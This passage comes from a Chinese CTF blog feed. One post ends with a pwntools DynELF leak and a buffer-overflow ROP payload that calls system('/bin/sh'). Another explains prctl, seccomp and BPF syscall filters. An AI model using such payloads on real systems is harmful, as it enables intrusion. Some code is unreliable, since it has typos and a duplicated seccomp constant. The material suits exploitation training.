class=\"token comment\">#addr 为想要获得的函数地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tpayload_leak<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token string\">\"write_plt\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tp<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload_leak<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tfun_addr<span class=\"token operator\">=</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> fun_addr</pre></td></tr></table></figure><p>然后需要实例化该函数（指向 ELF 文件的指针或者使用 ELF 类加载的目标文件至少提供一个作为可选参数）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynELF<span class=\"token punctuation\">(</span>lead<span class=\"token punctuation\">,</span>pointer<span class=\"token operator\">=</span>pointer_into_ELF_file<span class=\"token punctuation\">,</span> elf<span class=\"token operator\">=</span>ELFObject<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>实例化举例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>d<span class=\"token operator\">=</span>DynEF<span class=\"token punctuation\">(</span> leak<span class=\"token punctuation\">,</span> elf<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来可以运用实例化对象来找到想要的地址（通过这个实例 d 的方法 lookup 来搜寻 libc 库函数）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>system<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>read<span class=\"token operator\">=</span>d<span class=\"token punctuation\">.</span>lookup<span class=\"token punctuation\">(</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#用 read 是因为程序里没有 '/bin/sh' 字符串时，还需要我们写入字符串，一般为 bbs 段内</span></pre></td></tr></table></figure><p>最后的 payload 为</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">140</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#顺序为先执行 read 再到 system</span></pre></td></tr></table></figure><p>需要查看 write 函数能不能在程序中实现任意地址的读取打印<br />\n可以时可以用 DynELF</p>\n<p>DynELF 泄露函数方法最方便的使用情况是程序中最好含有 write 函数等输出函数且可以多次反复调用，并且 DynELF 找的是字符串</p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODI3OTkwL2FydGljbGUvZGV0YWlscy84NjY4OTc2MA==\">https://blog.csdn.net/qq_40827990/article/details/86689760</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/",
            "url": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/%E6%B2%99%E7%9B%92%E6%9C%BA%E5%88%B6/",
            "title": "沙盒机制",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>沙盒机制也就是我们常说的沙箱，英文名 <code>sandbox</code> ，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。</p>\n<p>在 ctf 比赛中，pwn 题中的沙盒一般都会限制 <code>execve</code>  的系统调用，这样一来 <code>one_gadget</code>  和 <code>system</code>  调用都不好使，只能采取 <code>open/read/write</code>  的组合方式来读取 flag。当然有些题目可能还会将上面三个系统调用砍掉一个，进一步限制我们获取到 flag.</p>\n<h1 id=\"1prctl函数调用\"><a class=\"anchor\" href=\"#1prctl函数调用\">#</a> 1.prctl 函数调用</h1>\n<p>prctl 是进程管理函数，沙箱规则通过 prctl 函数实现（也可以通过 seccomp 库函数实现），由它决定了哪些 <code>系统调用函数</code> 能被调用哪些不能被调用</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 函数原型</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/prctl.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> option<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg3<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg4<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> arg5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>option 选项有很多，剩下的参数也由 option 确定，这里介绍两个主要的 option<br />\n <code>PR_SET_NO_NEW_PRIVS(38)</code>  和  <code>PR_SET_SECCOMP(22)</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Get/set process seccomp mode */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_SECCOMP</span>      <span class=\"token expression\"><span class=\"token number\">21</span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_SECCOMP</span>     <span class=\"token expression\"><span class=\"token number\">22</span></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> * 用 22 时一般只允许 read、write、exit、sigereturn 函数执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> * If no_new_privs is set, then operations that grant new privileges (i.e.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> * execve) will either fail or not grant them.  This affects suid/sgid,</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> * file capabilities, and LSMs.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> * Operations that merely manipulate or drop existing privileges (setresuid,</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> * capset, etc.) will still work.  Drop those privileges if you want them gone.</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"14\"></td><td><pre> * Changing LSM security domain is considered a new privilege.  So, for example,</pre></td></tr><tr><td data-num=\"15\"></td><td><pre> * asking selinux for a specific new context (e.g. with runcon) will result</pre></td></tr><tr><td data-num=\"16\"></td><td><pre> * in execve returning -EPERM.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre> *</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> * See Documentation/userspace-api/no_new_privs.rst for more details.</pre></td></tr><tr><td data-num=\"19\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_SET_NO_NEW_PRIVS</span>    <span class=\"token expression\"><span class=\"token number\">38</span></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">PR_GET_NO_NEW_PRIVS</span>    <span class=\"token expression\"><span class=\"token number\">39</span></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">// 为 38 时一般禁用 execve</span></pre></td></tr></table></figure><p>1.option 为 22 的情况 ( <code>#define PR_GET_SECCOMP     22</code> )</p>\n<ul>\n<li><code>第二个参数为1</code> ，只允许调用 <code>read/write/_exit(not exit_group)/sigreturn</code>  这几个 <code>syscall(系统调用)</code> :  <code>prctl(22,1LL,&amp;V1)</code></li>\n<li>第二个参数为 2，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则:  <code>prctl(22, 2LL, &amp;v1);</code> (第二个参数为 2 时，则会利用 <code>参数3</code>  的指向的 <code>sock_fprog结构体</code>  的成员指向的 <code>sock_filter</code>  定义的规则来进行过滤 <code>任意系统调用和系统调用参数</code> ，通过这种方式我们可以自己定义想要过滤的系统调用)</li>\n</ul>\n<p>2.option 为 38 的情况 ( <code>#define PR_SET_NO_NEW_PRIVS    38</code> )</p>\n<ul>\n<li><code>第二个参数设置为1</code> ，则禁用 execve 系统调用且可以通过 fork () 函数和 clone () 函数 <code>继承给子进程</code> :  <code>prctl(38, 1LL, 0LL, 0LL, 0LL);</code></li>\n<li><code>第二个参数设置为2</code> ，则为过滤模式，其中对 syscall 的限制通过参数 3 的结构体来自定义过滤规则</li>\n</ul>\n<h2 id=\"bpf过滤规则伯克利封装包过滤\"><a class=\"anchor\" href=\"#bpf过滤规则伯克利封装包过滤\">#</a> BPF 过滤规则（伯克利封装包过滤）</h2>\n<p>上面提到的 <code>PT_SET_SECCOMP</code>  这个参数，后面接到的第一个参数，就是它设置的模式，第三个参数，指向 <code>sock_fprog结构体</code> ，sock_fprog 结构体中，又有指向 <code>sock_filter结构体</code> 的指针 ( <code>struct sock_filter *filter; /*指向包含struct sock_filter的结构体数组指针*/</code> )，sock_filter 结构体这里，就是我们要设置 <code>规则</code> 的地方</p>\n<p>这里利用别人定义的 <code>sock_filter</code> :</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stddef.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/seccomp.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/filter.h></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/prctl.h></span>    </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;linux/bpf.h></span>             <span class=\"token comment\">//off 和 imm 都是有符号类型，编码信息定义在内核头文件 linux/bpf.h</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 结构体数组</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_LD<span class=\"token operator\">|</span>BPF_W<span class=\"token operator\">|</span>BPF_ABS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>   <span class=\"token comment\">// 从第 0 个字节开始，传送 4 个字节</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP<span class=\"token operator\">|</span>BPF_JEQ<span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 比较是否为 59（execve 的系统调用号），是就跳过下一行（进入到下面的异常处理），如果不是，就执行下一行，第三个参数表示执行正确的指令跳转，第四个参数表示执行错误的指令跳转</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token function\">BPF_JUMP</span><span class=\"token punctuation\">(</span>BPF_JMP<span class=\"token operator\">|</span>BPF_JGE<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">//        杀死一个进程</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">//        父进程追踪子进程，具体没太搞清楚</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                 <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET<span class=\"token operator\">+</span>BPF_K<span class=\"token punctuation\">,</span>SECCOMP_RET_ERRNO<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">//        异常处理</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token function\">BPF_STMT</span><span class=\"token punctuation\">(</span>BPF_RET<span class=\"token operator\">+</span>BPF_K<span class=\"token punctuation\">,</span>SECCOMP_RET_ALLOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">//        这里表示系统调用如果正常，允许系统调用</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_fprog</span> prog<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token punctuation\">.</span>len<span class=\"token operator\">=</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>sock_filter<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token punctuation\">.</span>filter<span class=\"token operator\">=</span>filter<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_NO_NEW_PRIVS<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">prctl</span><span class=\"token punctuation\">(</span>PR_SET_SECCOMP<span class=\"token punctuation\">,</span>SECCOMP_MODE_FILTER<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 第一个参数是进行什么设置，第二个参数是设置的过滤模式，第三个参数是设置的过滤规则</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>设置了 sock_filter 结构体数组。这里为什么是一个结构体数组呢？</p>\n<pre><code>结构体数组：\n数组中的每个元素都是一个结构体\n</code></pre>\n<p>因为我们看到里面有 BPF_STMT 和 BPF_JMP 的宏定义，其实 BPF_STMT 和 BPF_JMP 都是条件编译后 <code>赋值</code> 的 sock_filter 结构体</p>\n<p>sock_filer 结构体:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sock_filter</span> <span class=\"token punctuation\">&#123;</span>            <span class=\"token comment\">/* Filter block */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    __u16 code<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* Actual filter code,bpf 指令码</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    __u8  jt;                   /* Jump true */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    __u8  jf<span class=\"token punctuation\">;</span>                   <span class=\"token comment\">/* Jump false */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    __u32 k<span class=\"token punctuation\">;</span>                    <span class=\"token comment\">/* Generic multiuse field */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//seccomp-data 结构体记录当前正在进行 bpf 规则检查的系统调用信息</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">seccomp_data</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> nr<span class=\"token punctuation\">;</span><span class=\"token comment\">// 系统调用号</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    __u32 arch<span class=\"token punctuation\">;</span><span class=\"token comment\">// 调用架构</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    __u64 instruction_pointer<span class=\"token punctuation\">;</span><span class=\"token comment\">//CPU 指令指针</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    __u64 argv<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 寄存器的值，x86 下是 ebx，exc,edx,edi,ebp;x64 下是 rdi,rsi,rdx,r10,r8,r9</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</span></p>\n<h1 id=\"2seccomp库函数\"><a class=\"anchor\" href=\"#2seccomp库函数\">#</a> 2.seccomp 库函数</h1>\n<pre><code>SCMP_ACT_ALLOW(0x7fff0000U) 黑名单外的进程可以被执行（黑名单内的不能执行）\nSCMP_ACT_KILL( 0x00000000U) 白名单外的进程被杀死\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sandbox</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">// 两个重要的宏，SCMP_ACT_ALLOW (0x7fff0000U) SCMP_ACT_KILL ( 0x00000000U)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">//seccomp_init 初始化，参数为 0 表示白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的 syscall</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// 参数为 0x7fff0000U 则为黑名单模式，在名单里的会被杀死</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">seccomp_init</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v1 <span class=\"token punctuation\">)</span>    <span class=\"token comment\">// 初始化失败，v1&lt;=0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"seccomp error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">//seccomp_rule_add 添加规则</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">//v1 对应上面初始化的返回值</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">// 0x7fff0000 即对应宏 SCMP_ACT_ALLOW（黑名单）</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">// 第三个参数代表对应的系统调用号，0-->read/1-->write/2-->open/60-->exit</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传 0 不做任何限制</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">231LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token comment\">// seccomp_load - Load the current seccomp filter into the kernel</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\">//load 成功则返回 0，这里 load 失败会执行 if 内部函数</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  \t<span class=\"token comment\">// seccomp_release - Release the seccomp filter state</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  \t<span class=\"token comment\">// 但对已经 load 